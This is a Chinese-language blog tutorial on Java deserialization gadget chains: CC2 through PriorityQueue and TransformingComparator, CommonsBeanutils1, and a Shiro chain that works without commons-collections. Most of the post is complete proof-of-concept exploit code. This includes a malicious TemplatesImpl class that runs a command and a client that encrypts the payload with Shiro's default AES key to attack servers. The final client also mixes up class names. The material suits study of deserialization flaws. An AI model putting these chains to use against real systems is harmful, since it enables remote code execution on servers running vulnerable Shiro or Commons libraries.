---
title: "无数组TransformingComparator CC2"
onlyTitle: true
date: 2022-10-23 13:05:36
categories:
- java
- CC
tags:
- CC
- shiroCommonBeanutils
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B861.jpg
---

# java_PriorityQueue

`java.util.PriorityQueue `是一个优先队列（Queue），节点之间按照优先级大小排序成一棵树。其中PriorityQueue有自己的readObject反序列化入口。

反序列化链为：`PriorityQueue#readObject`->`heapify()`->`siftDown()`->`siftDownUsingComparator()`->`comparator.compare()`。当comparator为TransformingComparator对象时，能触发transform()方法：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png)

至于PriorityQueue的`heapify()、siftDown()、siftDownUsingComparator()`的用处就是恢复排序、节点下移和比较元素大小。而Comparator则是定义了两个对象用什么方式比较

## CC2TransformingComparator

结合CC2的利用方式，就是向TransformingComparator传入恶意Transformer。

```java
Comparator comparator = new TransformingComparator(transformerChain);
```

再用priorityQueue触发comparator:

```java
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(2);
```

可以add任何非null对象，因为触发transform与队列参数无关（比较的是1,2，比较方式为comparator.compare()）

* POC：

```java
package org.example;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
public class CC2TransformingComparator {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class,
                        Object[].class }, new Object[] { null, new
                        Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class
                },
                        new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new
                ChainedTransformer(fakeTransformers);
        Comparator comparator = new
                TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain, "iTransformers", transformers);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}

```





测试结果：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206161847500.png)



## TemplatesImpl无数组TransformingComparator

用TemplatesImpl字节码的方式也能进行利用，并且还能用于shiro的无数组链：

同样的向TransformingComparator传入恶意Transformer，这次传的是InvokerTransformer，而非transformerChain数组

```java
Comparator comparator = new TransformingComparator(transformer);
```

触发comparator的方式还是实例化PriorityQueue对象

```java
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(obj);
queue.add(obj);
```

为什么要传TemplatesImpl的对象obj呢？回想在没有ConstantTransformer初始化对象的情况下，shiro反序列化是依靠TiedMapEntry的构造函数把初始化对象传入key

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164448132.png)

TiedMapEntry的hashcode调用了getValue，getValue触发lazyMap.get()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164623593.png)

但是在使用PriorityQueue类时，就无法用到shiro的入口HashMap，自然整条链都用不了。进入templatesImpl对象的newTransformer()入口的方式变为:

`PriorityQueue#Compare()`->`TransformingComparator#transform`->`InvokerTransformer`->`TemplatesImpl#newTransformer()`

只需要compare()时对象为恶意InvokerTransformer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png)



恶意字节码类：

```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("calc.exe");
    }
}
```





POC:

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class ShiroTransformingComparator {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    protected static byte[] getBytescode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);

        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}


```



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206173016563.png)



在4.1和3.2.2更新了`FunctorUtils#checkUnsafeSerialization`，3.2.2默认情况下会检测常见危险transformer(InstantiataTransformer、InvokerTransformer、PrototypeFactory等)的readObject进行调用，4.1这几个类直接不再实现Serilalizable接口



# CommonsBeanutil

javaBean的介绍：https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680

从中可以了解到getter、setter、属性的概念。

在上文，我们用`PriorityQueue#compare()`来触发`TransformingComparator#transform()`。除了这种方式外，还有`org.apache.commons.beanutils.BeanComparator.compare()`

BeanComparator.compare()方法代码如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206184052378.png)

其中的getProperty方法可以调用任意javaBean的getter方法（形如`getName`)。

```java
Object value1 = PropertyUtils.getProperty(o1,this.property);
```

该方法甚至可以递归查询:`PropertyUtils.getProperty(o1,"o2.name");`



现在反序列化链为：

`BeanComparator#compara()`->`PropertyUtils.getProperty()`-> `TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()`



`getOutputProperties()`符合getter的定义，所以property(属性名)的值为OutputProperties时，触发反序列化链。PriorityQueue队列和property的值可以用反射的方式修改。

```java
setFieldValue(comparator, "property", "outputProperties");
setFieldValue(queue, "queue", new Object[]{obj, obj});
```



POC：

```java
package org.example;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "godown");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2,comparator);
// stub data for replacement later
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```





![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206210050408.png)

那么这条链跟上面那个只用到了priorityQueue的区别在哪？

好像只是反序列化的入口从newInstance变成了getOutputProperties？

正是因为不再需要newInstance作为入口，也就不再需要Invokertransformer进行调用。也就是

`PriorityQueue#Compare()`->`TransformingComparator#transform`->`InvokerTransformer`->`TemplatesImpl#newTransformer()`这段过程可以全部舍弃掉，转而换成：

`PriorityQueue#compare()`->`BeanComparator#compare()`->`PropertyUtils.getProperty()`-> `TemplatesImpl#getOutputProperties()`

因此3.2.2和4.1就能开心的拿着这个payload去打



## 不需要CC库的shiroCommonBeanutils

shiro本身依赖commons-beautils库。所以上面的payload可以直接改造用来打shiro。

> 如果本地commons-beanutils和服务器shiro的CB版本不一样的话，serialVersionUID就会不同，也就不兼容。也就是打的时候需要把本地commons-beanutils改成和服务器一样的版本

那服务端没有commons-collections库的时候呢？

在new BeanComparator时，BeanComparator构造函数使用了ComparableComparator

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113456298.png)

而这个类来自commons.collections，所以要避开使用这个缺省参数。也就是要找到一个类有comparator接口和serializable接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113534550.png)

`CaseInsensitiveComparator`不仅实现了上面两个接口，还在java.lang.String下。而且用getOutputProperties的方式调用是不需要用到恶意comparator的，只需要恶意property

所以修改Beancomparator初始化时的参数为CaseInsensitiveComparator的对象就行了：

`final BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);`



POC：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class ShiroCommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
}
public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,comparator);
// stub data for replacement later
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
// ==================
// 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return barr.toByteArray();
        }
}
```



转字节码打shiro poc：

```java
package org.example;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
public class Clientattack {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(org.example.ShiroCommonsBeanutils1.class.getName());
        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125223110.png)





![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125113917.png)







参考：phith0n《java安全漫谈(16、17)》

